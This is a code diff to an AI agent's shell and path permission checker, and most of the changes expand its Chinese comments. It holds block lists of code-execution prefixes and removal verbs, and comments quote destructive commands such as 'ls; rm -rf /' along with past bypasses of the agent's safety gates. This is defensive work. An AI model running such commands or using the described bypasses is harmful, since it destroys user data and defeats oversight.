+    - 写:不在 _PROTECTED_PATHS、不在写保护目录(项目自身代码),且落在
+      allowed_roots 之一里面,三者都满足才放行。
+
+    参数:
+        path: 待检查的路径。
+        write: 是否写操作(默认 False 只读)。
+        allowed_roots: 允许写入的根目录列表;不传就用默认
+            (工作目录 + ~/.OmniMate + 额外白名单)。
+
+    返回:PermissionResult(含允许与否、原因、给出结论的关卡)。
     """
-    # R16 #2：可疑路径形态前置检查（读写都查，命中即拒）
+    # R16 #2:可疑路径形态先查(读写都查,查到就拒——防止绕过下面两道检查)
     susp = check_suspicious_path(path, write=write)
     if susp:
         return PermissionResult(False, f"可疑路径形态: {susp}", "suspicious")
 
-    # 先检查受保护路径（读写都拒）
+    # 再查受保护路径(读写都拒)
     prot = is_protected_path(path)
     if prot:
         return PermissionResult(False, f"受保护路径: {prot}", "protected")
@@ -556,7 +659,7 @@ def safe_path(
     if not write:
         return PermissionResult(True, "ok", "ok")
 
-    # 写保护路径(只禁写:项目代码目录)
+    # 写保护路径(只禁写:OmniMate 项目自身代码目录)
     wprot = is_write_protected_path(path)
     if wprot:
         return PermissionResult(
@@ -565,7 +668,7 @@ def safe_path(
             "protected",
         )
 
-    # 写操作检查白名单
+    # 写操作最后过白名单
     if allowed_roots is None:
         allowed_roots = default_allowed_roots()
     allowed_roots = [Path(p).resolve() for p in allowed_roots]
@@ -582,8 +685,8 @@ def safe_path(
             resolved.relative_to(root)
             return PermissionResult(True, "白名单内", "ok")
         except (OSError, ValueError):
-            # X17 fix: 合并 OSError + ValueError 到一个 except
-            # 之前两段连续 except 是死代码（ValueError 已被前者捕获）
+            # 历史踩坑(X17 修复):OSError 和 ValueError 要合并在一个 except 里
+            # ——之前写成两段连续的 except,第二段是死代码(轮不到执行)
             continue
 
     return PermissionResult(
@@ -594,19 +697,21 @@ def safe_path(
 
 
 # ---------------------------------------------------------------------------
-# T7（核心机制对齐第 7 项）：只读命令识别 → 快速通道 + concurrency-safe
+# T7(核心机制对齐第 7 项):识别"只读命令"——它们可走免审批快速通道,
+# 也算并发安全(concurrency-safe),可以同时多个一起跑
 # ---------------------------------------------------------------------------
 
-# 只读前缀表（对齐 CCB 只读命令识别；前缀 + 空白匹配，参数任意）
-# 注意：只收"无副作用"形态——git branch/tag/remote 等只列只读子形态
+# 只读前缀表(对齐 CCB 的只读命令识别;按"前缀 + 空格"匹配,后面参数随便)
+# 注意:只收"绝对无副作用"的形态——git branch/tag/remote 这类命令只把
+# 它们的只读子命令形态列进来(带名字参数的 "git branch x" 是建分支,是写)
 _READONLY_PREFIXES = frozenset({
     # 文件/目录查看
     "ls", "dir", "tree", "pwd", "cat", "head", "tail", "wc", "file", "stat",
     "du", "df", "which", "where", "whereis", "type",
-    # 搜索（find 的 -delete/-exec 等写形态由 _READONLY_FORBIDDEN_TOKENS 拦）
+    # 搜索(find 的 -delete/-exec 等写形态由 _READONLY_FORBIDDEN_TOKENS 拦)
     "find", "grep", "rg", "ag", "findstr",
-    # git 只读子命令（写形态 push/commit/checkout 等不在表里；
-    # branch/tag/remote 只收只读子形态——带名字参数的 "git branch x" 是写）
+    # git 只读子命令(写形态 push/commit/checkout 等不进表;
+    # branch/tag/remote 只收只读子形态——带名字参数的 "git branch x" 是写)
     "git status", "git log", "git diff", "git show", "git blame",
     "git shortlog", "git describe", "git rev-parse", "git ls-files",
     "git ls-remote", "git remote -v",
@@ -621,35 +726,45 @@ _READONLY_PREFIXES = frozenset({
     "git --version", "python --version", "python3 --version",
     "node --version", "java -version", "go version",
     "rustc --version", "cargo --version", "uv --version", "pytest --version",
-    # 系统信息（env 不进表：env VAR=x cmd 可执行任意命令）
+    # 系统信息(env 不进表:env VAR=x cmd 这种写法能执行任意命令)
     "whoami", "hostname", "uname", "date", "printenv", "echo",
     "id", "systeminfo", "tasklist",
 })
 
-# 只读段里禁止出现的 token（find 的写形态等）
-# R30b-B4：加 "--output"——git diff/show 的 --output=<file> 会写文件，
-# 不能享受只读快速通道 + 并发放宽（重定向 > 已由 _REDIRECT_RE 拦，这是参数形态）
+# 只读段里禁止出现的参数(出现就说明它其实是写操作,比如 find -delete)
+# R30b-B4 补了 "--output":git diff/show 的 --output=<文件> 会写文件,
+# 不能享受只读快速通道和并发放宽(重定向 > 已由 _REDIRECT_RE 拦,
+# 这里拦的是参数形态的写)
 _READONLY_FORBIDDEN_TOKENS = (
     "-delete", "-exec", "-execdir", "-ok", "-okdir",
     "-fprint", "-fprintf", "-fls", "-fprint0",
     "--output",
 )
 
-# 复合命令切分（&& || ; | & 后台 换行）+ 子命令替换（$() 反引号）+ 重定向（> >>）
-# R27 终审 follow-up：& 后台分隔与换行分隔也切——切段后逐段判只读，
-# 交给 AST/正则精确判定，不再让 "ls & rm xxx" 整串混过
+# 复合命令切分(按 && || ; | & 后台 换行 这些分隔符切开)+ 子命令替换
+# ($() 反引号)+ 重定向(> >>)的正则。
+# R27 终审 follow-up:& 后台分隔和换行分隔也要切——切完逐段判只读,
+# 交给 AST/正则精确判定,不能让 "ls & rm xxx" 混成一段蒙混过关
 _COMPOUND_SPLIT_RE = re.compile(r"&&|\|\||;|\||&|\r|\n")
 _SUBSHELL_RE = re.compile(r"\$\(|`")
-# 进程替换形态 <( ) >( )——bashlex 实测与 $() 分开识别，正则层单独拦
+# 进程替换形态 <( ) >( )——实测 bashlex 把它和 $() 分开识别,
+# 正则层也得单独拦一道
 _PROCSUB_RE = re.compile(r"[<>]\(")
 _REDIRECT_RE = re.compile(r"(?:^|\s|\d)>{1,2}(?:&\d+)?")
 
 
 def _is_readonly_segment(seg: str) -> bool:
-    """单个命令段是否只读（前缀表匹配 + 写形态 token 拦截）。"""
+    """判断单个命令段是否只读(前缀表匹配 + 写形态参数拦截)。
+
+    参数:
+        seg: 一段命令(已经按分隔符切开的)。
+
+    返回:True 表示只读。空段(比如结尾多个分号)直接算通过;
+    含命令替换或重定向的一律不算。
+    """
     seg = seg.strip()
     if not seg:
-        return True  # 空段（尾随 ; 等）忽略
+        return True  # 空段(比如尾随的分号)忽略
     if _SUBSHELL_RE.search(seg) or _REDIRECT_RE.search(seg):
         return False
     lowered = seg.lower()
@@ -663,12 +778,22 @@ def _is_readonly_segment(seg: str) -> bool:
 
 
 def _tokens_readonly(tokens: List[str]) -> bool:
-    """token 序列是否只读（R27 #21：AST 段的词序列匹配版 _is_readonly_segment）。
+    """判断一个词(token)序列是否只读(R27 #21:AST 段专用的词序列匹配版)。
 
-    - 跳过头部 env 赋值 token（FOO=1 ls → 动词 ls）
-    - 任一禁 token（find -delete 等）出现 → False
-    - 动词序列须命中 _READONLY_PREFIXES 的**词序列前缀**（比正则的
-      字符串前缀更精确：`gitx status` 不会因 "git" 前缀误判）
+    和 _is_readonly_segment 干的活一样,但输入是拆好的词列表而不是字符串。
+    为什么单独要一版:AST 解析出来的段天然是词列表,按**词序列**匹配前缀
+    比按字符串前缀匹配更精确——`gitx status` 不会因为 "git" 字符串前缀
+    而被误判成只读。
+
+    规则:
+    - 开头的环境变量赋值词跳过(FOO=1 ls 的动词是 ls);
+    - 出现任何禁用参数(find -delete 之类)→ False;
+    - 动词序列必须命中 _READONLY_PREFIXES 里的词序列前缀才算只读。
+
+    参数:
+        tokens: 词列表。
+
+    返回:True 表示只读。
     """
     toks = [t for t in tokens if t]
     i = 0
@@ -689,20 +814,30 @@ def _tokens_readonly(tokens: List[str]) -> bool:
 
 
 def _is_readonly_command(command: str) -> bool:
-    """命令是否整体只读（T7；R27 #21 加 AST 兜底）。
+    """判断整条命令是否只读(T7 引入;R27 #21 加了 AST 兜底)。
 
-    复合命令（含 && / || / ; / | / $() / 反引号）必须**每段**都是只读才算只读；
-    出现重定向（> >>）直接判非只读。保守优先：识别不了的形态一律不算只读。
+    干什么:复合命令(含 && / || / ; / | / $() / 反引号)必须**每一段**
+    都是只读才算只读;出现重定向(> >>)直接判非只读。保守优先:识别不了
+    的形态一律不算只读。
 
-    R27 #21 AST 兜底：正则判非只读时用 bashlex 精确解析一次——
-    引号内的 && 是参数不是分隔（正则误切），AST 分得清；每段动词
-    仍须在 _READONLY_PREFIXES 表内（正判不放宽白名单面）。
-    解析失败 → 维持正则结论（fail-open）。
+    为什么重要:这个判定直接决定命令能不能走免审批快速通道、能不能并发跑,
+    判松了危险命令就会蒙混过关。
+
+    参数:
+        command: 完整命令字符串。
+
+    返回:True 表示只读。
+
+    R27 #21 的 AST 兜底:正则判"非只读"时,再用 bashlex 精确解析一次——
+    引号里的 && 只是参数不是分隔符(正则会误切),AST 分得清;但每段动词
+    仍然必须在 _READONLY_PREFIXES 表内(正判不放宽白名单面)。
+    解析失败就维持正则的结论(fail-open,不引入新拒绝)。
     """
     if not command or not command.strip():
         return False
-    # 替换形态（$() 反引号 <() >()）禁止正则快速通道直通——必须交 AST 裁决
-    # （引号里的字面 $() AST 分得清；实测曾漏 `cat <(ls)` 免审，Critical 修复）
+    # 含替换形态($() 反引号 <() >())的命令不许走正则快速通道直通——必须
+    # 交 AST 裁决。历史踩坑:引号里的字面 $() AST 能分清,而实测曾经漏掉
+    # `cat <(ls)` 让它免审通过(Critical 级修复)
     has_sub_form = bool(_SUBSHELL_RE.search(command) or _PROCSUB_RE.search(command))
     regex_ok = True
     for seg in _COMPOUND_SPLIT_RE.split(command):
@@ -712,16 +847,16 @@ def _is_readonly_command(command: str) -> bool:
     if regex_ok and not has_sub_form:
         return True
 
-    # R27 #21：AST 兜底（一次解析，逐段判）
+    # R27 #21 的 AST 兜底(解析一次,逐段判)
     from agent.bash_ast import parse_info
     info = parse_info(command)
     if info is None:
-        return False  # 解析不了 → 维持正则结论（False）
+        return False  # 解析不了 → 维持正则的结论(False)
     if info["has_redirect"] or info["has_substitution"]:
         return False
     for tokens in info["segments"]:
         seg_text = " ".join(tokens)
-        # 纵深防御：bashlex 漏检的替换形态，正则兜底拦（双保险）
+        # 纵深防御:万一 bashlex 漏检了替换形态,正则再兜一道(双保险)
         if _SUBSHELL_RE.search(seg_text):
             return False
         if not _tokens_readonly(tokens):
@@ -730,27 +865,38 @@ def _is_readonly_command(command: str) -> bool:
 
 
 def is_readonly_command(command: str) -> bool:
-    """公开入口：terminal 并发分组用（与审批快速通道同一张表）。"""
+    """公开入口:给 terminal 工具的并发分组用(和审批快速通道共用同一张判定表)。
+
+    参数:
+        command: 完整命令字符串。
+
+    返回:True 表示只读(可并发安全执行)。
+    """
     return _is_readonly_command(command)
 
 
 # ---------------------------------------------------------------------------
-# 闸门 4：aux_llm 分类器（feature flag 门控，默认 OFF）
+# 闸门 4:aux_llm 分类器(让副 LLM 判断命令安全性;feature flag 控制开关,
+# 默认关)
 # ---------------------------------------------------------------------------
 #
-# 触发条件：前三道闸门都未拒绝也未要求审批（即落到 check() 末尾的"默认通过"）
-#           且 feature flag bash_llm_classifier.enabled=True。
-# 白名单快速通道（spec §4 决策 4）：命令匹配白名单前缀（如 "ls"、"git status"）
-#           则直接放行，0 LLM 调用。白名单从 config.features.bash_llm_classifier.whitelist 读。
-# AI 判断：safe → 放行；unsafe → 拒绝 + 原因。fail-open：LLM 调用失败 → 放行（log warning）。
+# 什么时候触发:前三道闸门都没拒绝、也没要求审批(也就是命令快落到
+# check() 末尾"默认通过"了),且 feature flag
+# bash_llm_classifier.enabled=True(配置里开了)。
+# 白名单快速通道(spec 第 4 节决策 4):命令匹配白名单前缀(如 "ls"、
+# "git status")就直接放行,0 次 LLM 调用。白名单从
+# config.features.bash_llm_classifier.whitelist 读。
+# AI 判断:safe → 放行;unsafe → 拒绝并给原因。容错 fail-open:
+# LLM 调用失败就放行(记 log warning,别把用户卡死)。
 #
-# 注：aux_llm_router.chat_completions 是 async（Task D4）；
-#     PermissionChecker.check 是 sync 函数 → 用 asyncio.run 桥接
-#     （参考 progress.py:124 / reflection.py:150 的同款模式）。
+# 注:aux_llm_router.chat_completions 是 async 的(Task D4 改的);
+# 而 PermissionChecker.check 是同步函数 → 用 asyncio.run 桥接
+# (progress.py / reflection.py 里也有同款写法)。
 
-# 分类 prompt（R26 #11 三向化）：要 LLM 输出严格 JSON，便于解析。
-# {nl_rules} 由 _check_llm_classifier 读 settings.json permissions.nl_rules 注入
-# （通过 aux_llm_router.nl_rules_cache 传递——分类函数侧拿不到 config）。
+# 分类用的提示词模板(R26 #11 起三向):要求 LLM 输出严格的 JSON,方便解析。
+# {nl_rules} 由 _check_llm_classifier 读 settings.json 的
+# permissions.nl_rules 后注入(通过 aux_llm_router.nl_rules_cache 这个属性
+# 传递——因为分类函数这边拿不到 config)。
 _CLASSIFY_PROMPT_TEMPLATE = """你是命令安全分类器。判断下面这条 shell 命令该放行、拒绝还是交人工审批。
 
 用户自然语言权限规则（优先级最高，逐条对照）：
@@ -768,18 +914,20 @@ confidence < 0.7 时请直接给 ask。
 """
 
 # ---------------------------------------------------------------------------
-# R21 #46：LLM 分类器增强（拒绝回落 + 危险前缀剥离）
+# R21 #46:LLM 分类器增强(拒绝回落 + 危险前缀剥离)
 # ---------------------------------------------------------------------------
 
-# 拒绝回落阈值（对齐 CCB DENIAL_LIMITS）：连续 3 次或累计 20 次判 unsafe
-# → 本会话闸门 4 停用（分类器明显与用户意图不合拍，回落人工审批）。
+# 拒绝回落阈值(对齐 CCB 的 DENIAL_LIMITS):连续 3 次或累计 20 次判 unsafe
+# → 本会话停用闸门 4。为什么:分类器明显和用户意图不合拍了,与其反复
+# 误拒,不如回落人工审批。
 LLM_DENIAL_MAX_CONSECUTIVE = 3
 LLM_DENIAL_MAX_TOTAL = 20
 
-# 危险前缀（对齐 CCB CROSS_PLATFORM_CODE_EXEC + Bash 扩展）：白名单不得
-# 快通道任意代码执行入口——`Bash(python:*)` 类 allow/白名单条目会让
-# 分类器形同虚设（解释器/runner/eval/env/xargs 都能执行任意代码）。
-# 白名单里的这类条目在闸门 4 内被忽略（不修改 config，只影响快速通道）。
+# 危险前缀表(对齐 CCB 的 CROSS_PLATFORM_CODE_EXEC 加 Bash 扩展):白名单
+# 不许给"任意代码执行入口"开快速通道——`Bash(python:*)` 这类 allow/白名单
+# 条目会让分类器形同虚设(解释器、包 runner、eval、env、xargs 都能执行
+# 任意代码)。白名单里的这类条目只在闸门 4 内部被忽略(不改用户的 config,
+# 只是不让它们享受免 LLM 的快速通道)。
 _DANGEROUS_CLASSIFIER_PREFIXES = frozenset({
     # 解释器
     "python", "python3", "python2", "node", "deno", "tsx", "ruby", "perl",
@@ -798,13 +946,22 @@ _DANGEROUS_CLASSIFIER_PREFIXES = frozenset({
 
 
 def _is_dangerous_whitelist_entry(entry: str) -> bool:
-    """白名单条目是否命中危险前缀（精确 / x:* / 前缀词 / 组合词形态）。"""
+    """判断一个白名单条目是否命中危险前缀(即"能执行任意代码"的入口)。
+
+    参数:
+        entry: 白名单条目字符串(如 "python" / "python -c" / "npm run")。
+
+    返回:True 表示危险(不给开快速通道)。按四种形态比对:和表里精确
+    相等;x:* 旧前缀形态(取前段比对);首词命中(python -c、npx pkg);
+    前两个词的组合命中(npm run build——"npm run" 本身是表里的独立条目)。
+    空条目/纯空白也算危险(这种本来就不该进白名单)。
+    """
     if not entry or not entry.strip():
-        return True  # 空/纯空白条目本身就不该进白名单
+        return True  # 空条目/纯空白条目本身就不该进白名单
     e = entry.strip().lower()
     if e in _DANGEROUS_CLASSIFIER_PREFIXES:
         return True
-    # x:* 旧前缀形态 → 取前段判定
+    # x:* 旧前缀形态 → 去掉尾部的 :* 取前段再比对
     if e.endswith(":*"):
         e = e[:-2].strip()
         if e in _DANGEROUS_CLASSIFIER_PREFIXES:
@@ -812,47 +969,58 @@ def _is_dangerous_whitelist_entry(entry: str) -> bool:
     words = e.split()
     if not words:
         return True
-    # 首词判定（python -c / npx pkg 等）
+    # 首词比对(python -c / npx pkg 这类)
     if words[0] in _DANGEROUS_CLASSIFIER_PREFIXES:
         return True
-    # 组合词判定（npm run build / npm run:*——"npm run" 是独立危险条目）
+    # 前两词组合比对(npm run build / npm run:*——"npm run" 在表里是独立条目)
     if len(words) >= 2 and f"{words[0]} {words[1]}" in _DANGEROUS_CLASSIFIER_PREFIXES:
         return True
     return False
 
 
 def _matches_whitelist(command: str, whitelist: List[str]) -> bool:
-    """检查命令是否匹配白名单前缀（快速通道，0 LLM 调用）。
+    """检查命令是否匹配白名单前缀(命中就走快速通道,0 次 LLM 调用)。
 
-    判断规则（spec §4 决策 4）：
-    - 命令去除前导空白后，以白名单条目 + 空白/行尾 开头
-    - 例：白名单 "ls" 匹配 "ls -la"、"ls /tmp"；不匹配 "ls; rm -rf /"（含复合操作符）
-    - 含 shell 复合操作符（&&/||/;/|/反引号/$()）的命令不匹配（保守，交 LLM 判）
+    参数:
+        command: 待检查的命令。
+        whitelist: 白名单条目列表(已经剥掉危险前缀后的)。
+
+    返回:True 表示命中。规则(spec 第 4 节决策 4):
+    - 命令去掉前导空白后,要么和白名单条目一模一样,要么以"条目 + 空格"开头;
+    - 例:白名单 "ls" 匹配 "ls -la"、"ls /tmp";不匹配 "ls; rm -rf /"
+      (含复合操作符的不算);
+    - 含 shell 复合操作符(&&/||/;/|/反引号/$())的命令一律不匹配
+      (保守,交给 LLM 判)。
     """
     if not command or not whitelist:
         return False
     cmd = command.strip()
-    # 含复合操作符的命令不走快速通道（可能藏危险子命令）
+    # 含复合操作符的命令不走快速通道(后半段可能藏着危险子命令)
     if any(op in cmd for op in ("&&", "||", ";", "|", "`", "$(")):
         return False
     for entry in whitelist:
         if not entry:
             continue
-        # 精确匹配（命令就是白名单条目本身）
+        # 精确匹配(命令和白名单条目一模一样)
         if cmd == entry:
             return True
-        # 前缀 + 空白（"ls -la" 匹配 "ls" + " "）
+        # 前缀 + 空格("ls -la" 命中白名单 "ls" 加一个空格)
         if cmd.startswith(entry) and len(cmd) > len(entry) and cmd[len(entry)].isspace():
             return True
     return False
 
 
 def _parse_classify_response(text: str) -> Dict[str, Any]:
-    """R26 #11：三向解析（allow/deny/ask + 置信度门控）。
+    """R26 #11:解析 LLM 分类器的回答(三向 + 置信度门控)。
 
-    - 兼容旧 safe 字段（true→allow / false→deny）
-    - confidence < 0.7 → ask（没把握就回落人工）
-    - 非法 JSON / 缺 verdict / 未知 verdict 值 → ask 或 error（保守）
+    参数:
+        text: LLM 返回的原始文本。
+
+    返回:{"verdict": "allow"/"deny"/"ask"}(可能带 "reason"),解析不了
+    返回 {"error": ...}。规则:
+    - 兼容旧的 safe 字段(true→allow / false→deny);
+    - confidence < 0.7 一律改成 ask(LLM 自己都没把握就回落问人);
+    - 不是合法 JSON / 缺 verdict / verdict 值不认识 → ask 或 error(保守)。
     """
     t = (text or "").strip()
     if t.startswith("```"):
@@ -866,7 +1034,7 @@ def _parse_classify_response(text: str) -> Dict[str, Any]:
         return {"error": f"输出非 JSON: {t[:80]}"}
     if not isinstance(parsed, dict):
         return {"error": "输出非对象"}
-    # 兼容旧格式
+    # 兼容旧版两态格式(safe: true/false)
     if "verdict" not in parsed and "safe" in parsed:
         parsed["verdict"] = "allow" if parsed["safe"] else "deny"
     verdict = str(parsed.get("verdict", "")).lower()
@@ -885,28 +1053,30 @@ def _parse_classify_response(text: str) -> Dict[str, Any]:
 
 
 async def _classify_bash_command(command: str, aux_llm_router: Any) -> Dict[str, Any]:
-    """调 aux_llm 判断命令是否安全。
+    """调副 LLM(aux_llm)判断一条命令安不安全。
 
-    Args:
-        command: 要判断的 shell 命令
-        aux_llm_router: AuxLLMRouter 实例（必须有 async chat_completions）
+    为什么需要:前三道闸门只看"长相"(正则/模式),有些命令长相普通但
+    语义危险(或反之),让 LLM 从意图层面再判一次。
 
-    Returns:
-        Dict：
-        - {"verdict": "allow"} 判放行
-        - {"verdict": "deny", "reason": "..."} 判拒绝
-        - {"verdict": "ask", "reason": "..."} 拿不准（升人工审批）
-        - {"error": "..."} 调用失败（fail-open，调用方放行）
+    参数:
+        command: 要判断的 shell 命令。
+        aux_llm_router: AuxLLMRouter 实例(必须带 async 的 chat_completions 方法)。
 
-    解析失败（LLM 没输出合法 JSON）→ 返回 {"error": "..."}，调用方 fail-open 放行。
+    返回:字典,四种可能——
+    - {"verdict": "allow"} 判放行;
+    - {"verdict": "deny", "reason": "..."} 判拒绝;
+    - {"verdict": "ask", "reason": "..."} 拿不准(升人工审批);
+    - {"error": "..."} 调用失败(fail-open,调用方放行)。
+
+    LLM 没输出合法 JSON 也按 {"error": ...} 返回,调用方 fail-open 放行。
     """
     if aux_llm_router is None:
-        # 没有 aux_llm → 不分类（check() 会 fail-open 放行）
+        # 没有副 LLM → 不分类(check() 那边会 fail-open 放行)
         return {"error": "aux_llm_router 未注入"}
 
     rules: list = []
-    # nl_rules 由调用方（_check_llm_classifier）读 config 注入——这里从 router 侧拿不到 config，
-    # 通过 aux_llm_router 上的可选属性传递（_check_llm_classifier 设置）
+    # 自然语言规则由调用方(_check_llm_classifier)读 config 后注入——这里从
+    # router 侧拿不到 config,所以借 aux_llm_router 上的一个临时属性传递
     rules = list(getattr(aux_llm_router, "nl_rules_cache", []) or [])
     prompt = _CLASSIFY_PROMPT_TEMPLATE.format(
         cmd=command,
@@ -917,11 +1087,11 @@ async def _classify_bash_command(command: str, aux_llm_router: Any) -> Dict[str,
             [{"role": "user", "content": prompt}],
         )
     except Exception as e:
-        # 调用本身抛异常 → fail-open
+        # 调用本身就抛异常 → fail-open 放行
         logger.warning("bash_llm_classifier: aux_llm 调用异常（fail-open 放行）: %s", e)
         return {"error": f"aux_llm 调用异常: {e}"}
 
-    # 解析响应：resp.choices[0].message.content
+    # 从响应里取正文:resp.choices[0].message.content
     try:
         text = resp.choices[0].message.content or ""
     except (AttributeError, IndexError, TypeError) as e:
@@ -932,24 +1102,30 @@ async def _classify_bash_command(command: str, aux_llm_router: Any) -> Dict[str,
 
 
 # ---------------------------------------------------------------------------
-# R16 #6：危险删除路径判定（rm/rmdir/del/erase/rd 目标参数化检查）
+# R16 #6:危险删除路径判定(对 rm/rmdir/del/erase/rd 的目标参数做专项检查)
 # ---------------------------------------------------------------------------
 
-# Windows 盘根（C: 或 C:/）
+# Windows 盘根(C: 或 C:/)
 _WIN_DRIVE_ROOT_RE = re.compile(r"^[A-Za-z]:/?$")
-# Windows 盘根直接子目录（C:/Windows、C:/Users）
+# Windows 盘根的直接子目录(C:/Windows、C:/Users)
 _WIN_DRIVE_CHILD_RE = re.compile(r"^[A-Za-z]:/[^/]+$")
 
 
 def is_dangerous_removal_path(resolved_path) -> bool:
-    r"""删除命令的目标路径是否危险（对齐 CCB isDangerousRemovalPath）。
+    r"""判断删除命令的目标路径是不是"删不得"的地方(对齐 CCB 的 isDangerousRemovalPath)。
 
-    危险目标：
-    - 裸通配符 *（删目录下全部内容）/ 任何 /* 结尾
-    - 根目录 /
-    - 家目录
-    - 根直接子目录（/usr、/tmp、/etc——但 /usr/local 不是）
-    - Windows 盘根（C:\）与盘根直接子目录（C:\Windows、C:\Users）
+    为什么要单独查:rm 一个普通文件和 rm 整个 /usr 完全是两回事,
+    前者可以审批,后者想都别想。危险目标:
+    - 裸通配符 *(删掉目录下全部内容)/ 任何以 /* 结尾的路径;
+    - 根目录 /;
+    - 家目录;
+    - 根目录的直接子目录(/usr、/tmp、/etc——但 /usr/local 不算,它更深一层);
+    - Windows 盘根(C:\)和盘根直接子目录(C:\Windows、C:\Users)。
+
+    参数:
+        resolved_path: 已解析成绝对路径的删除目标。
+
+    返回:True 表示这个目标删不得。
     """
     s = re.sub(r"[\\/]+", "/", str(resolved_path))
 
@@ -966,7 +1142,7 @@ def is_dangerous_removal_path(resolved_path) -> bool:
     if normalized.lower() == home.lower():
         return True
 
-    # 根直接子目录：/usr、/tmp（parent == /）
+    # 根目录的直接子目录:/usr、/tmp(父目录就是 / 的那一层)
     if normalized.startswith("/"):
         parts = normalized.lstrip("/").split("/")
         if len(parts) == 1 and parts[0]:
@@ -977,24 +1153,32 @@ def is_dangerous_removal_path(resolved_path) -> bool:
     return False
 
 
-# 删除类动词（首 token；Remove-Item 走闸门 2 破坏性审批兜底，不在此列）
+# 删除类动词(看命令第一个词;Remove-Item 不在此列,它由闸门 2 的
+# 破坏性审批兜底)
 _REMOVAL_VERBS = frozenset({"rm", "rmdir", "del", "erase", "rd"})
-# 复合命令切段（与只读通道 _COMPOUND_SPLIT_RE 同款——R30b-B1：补 & 后台
-# 与 \r\n 换行，此前 "echo hi\nrm -rf /" 会被当成一段、verb=echo 漏过本闸门）
+# 复合命令切段正则(与只读通道的 _COMPOUND_SPLIT_RE 同款)。历史踩坑
+# (R30b-B1):要补上 & 后台分隔和 \r\n 换行——此前 "echo hi\nrm -rf /"
+# 会被当成一段,动词是 echo,危险的后半段漏过本闸门
 _CMD_SEGMENT_SPLIT_RE = re.compile(r"&&|\|\||;|\||&|\r|\n")
 
-# R30g-M2：复合命令段数上限（DoS 防护，对齐 CCB MAX_SUBCOMMANDS=50——
-# 其注释记载超宽复合命令曾把安全检查拖到事件循环饿死）；超出直接升审批，
-# 不进任何解析路径
+# R30g-M2:复合命令段数上限(防 DoS——恶意/异常生成的超长复合命令会把
+# 安全检查拖到卡死,CCB 注释里记载过真实事故,上限同样取 50)。超限直接
+# 升审批,不进任何解析路径
 _MAX_COMPOUND_SEGMENTS = 50
 
 
 def _has_cd_git_combo(command: str) -> bool:
-    """R30g-M3：复合命令里 cd 之后出现 git（含 xargs git）→ True。
+    """R30g-M3:复合命令里 cd 之后再出现 git(含 xargs git)就返回 True。
 
-    cd 到攻击者可控目录再跑 git——恶意 bare repo 的 core.fsmonitor 等
-    配置注入可执行任意命令（CCB bashPermissions 同款闸门）。顺序敏感：
-    git 在 cd **之前**跑的是原目录，不构成该攻击面。
+    为什么要抓这个组合:cd 进一个攻击者可控的目录再跑 git——恶意构造的
+    bare repo(裸仓库)可以通过 core.fsmonitor 之类的配置注入执行任意命令
+    (CCB bashPermissions 的同款闸门)。顺序敏感:git 在 cd **之前**跑,
+    操作的是原目录,不构成这个攻击面,返回 False。
+
+    参数:
+        command: 完整命令字符串。
+
+    返回:True 表示存在"cd 之后的 git"。
     """
     segs = _CMD_SEGMENT_SPLIT_RE.split(command)
     if len(segs) < 2:
@@ -1012,16 +1196,23 @@ def _has_cd_git_combo(command: str) -> bool:
             if saw_cd:
                 return True
     return False
-# Windows del/rd 的斜杠 flag（/s /q）；不匹配 /usr 这类真路径
+# Windows del/rd 的斜杠式选项(/s /q);注意别把 /usr 这种真路径也当成选项
 _CMD_FLAG_RE = re.compile(r"^-[A-Za-z]*$|^/[A-Za-z]?$")
 
 
 def check_dangerous_removal(command: str, cwd: Optional[str] = None) -> Optional[str]:
-    """R16 #6：rm/del 类删除命令的目标为危险路径 → 拒。
+    """R16 #6:rm/del 类删除命令的目标是危险路径 → 拒。
 
-    任何审批模式下默认拒（不进 fatal——bypassPermissions 仍放行；
-    default/acceptEdits/autoDeny 都拒，不接受审批解锁：y/n 误点正是
-    这类检查要防的）。复合命令逐段检查。返回拒绝原因，未命中返回 None。
+    什么时候拒:在 default/acceptEdits/autoDeny 三种模式下都拒,而且
+    **不接受审批解锁**——用户手滑点了 y/n 正是这类检查要防的事故。
+    (它不算 fatal 底线:bypassPermissions 模式下仍然放行,区别于
+    rm -rf / 那种任何模式都拒的。)
+
+    参数:
+        command: 完整命令字符串(复合命令会逐段检查)。
+        cwd: 当前工作目录,相对路径以它为基准;不传用 os.getcwd()。
+
+    返回:命中返回拒绝原因文字,没命中返回 None。
     """
     if not command:
         return None
@@ -1046,27 +1237,28 @@ def check_dangerous_removal(command: str, cwd: Optional[str] = None) -> Optional
                 resolved = p if p.is_absolute() else (Path(base_dir) / p)
                 rp = str(Path(str(resolved)).resolve())
             except (OSError, ValueError, RuntimeError):
-                continue  # 解析失败的 token 交给其他闸门
+                continue  # 解析失败的 token 不硬拦,交给其他闸门处理
             if is_dangerous_removal_path(rp):
                 return f"危险删除目标: {rp}"
     return None
 
 
 # ---------------------------------------------------------------------------
-# 完整命令权限检查器（带审批缓存）
+# 完整命令权限检查器(带审批缓存)——权限系统的主入口类
 # ---------------------------------------------------------------------------
 
 class PermissionChecker:
-    """命令执行权限检查器。
+    """命令执行权限检查器:每条命令执行前都来问它。
 
-    四道闸门：
-      1. 硬拒绝（黑名单）
-      2. 破坏性命令（rm/del 等）需用户审批
-      3. 用户审批（callback + 会话内缓存）
-      4. aux_llm 分类（feature flag 门控，默认 OFF）
+    大白话:它就是那个"保安亭"。命令进来,按顺序过一道道关卡
+    (详见模块头):闸门 0 底线 → 内容级规则 → 危险删除 → acceptEdits
+    放行 → 闸门 1 硬拒绝黑名单 → 注入面 → 只读快速通道 → 闸门 2 破坏性
+    审批 → 闸门 4 副分类 → 闸门 3 默认通过。
 
-    持久化白名单：用户批准过的破坏性命令存 JSON，跨会话不再询问。
-    会话内缓存：本次会话批准过的命令不重复问（_approved）。
+    两级缓存免得反复打扰用户:
+    - 持久化白名单:用户批准过的破坏性命令存成 JSON 文件,跨会话不再问;
+    - 会话内缓存 _approved:本次会话批过的命令不重复问(新会话重置,
+      避免长期信任漂移)。
     """
 
     def __init__(
@@ -1079,85 +1271,108 @@ class PermissionChecker:
     ):
         """
         参数：
-            approval_callback: fn(command: str) -> bool，破坏性命令 / 路径审批。
-                              callback 内部可根据字符串内容判断是命令还是路径
-                              （含 / 或 \\ 或 ~ 开头 → 路径）。
-            whitelist_file: 持久化白名单 JSON 路径（如 ~/.OmniMate/approved_commands.json）。
-            paths_whitelist_file: 路径白名单 JSON（如 ~/.OmniMate/approved_paths.json）。
-                                  用户批准过的写入路径，跨会话不再询问。
-            mode: 权限模式。
-                  - "default": 四道闸门全开（黑名单 + 破坏性审批 + 默认通过 + 可选 LLM）。
+            approval_callback: 审批函数 fn(command: str) -> bool——破坏性命令或
